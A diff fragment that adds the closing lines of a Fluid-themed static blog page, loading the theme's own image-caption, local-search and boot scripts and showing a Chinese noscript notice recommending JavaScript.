+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
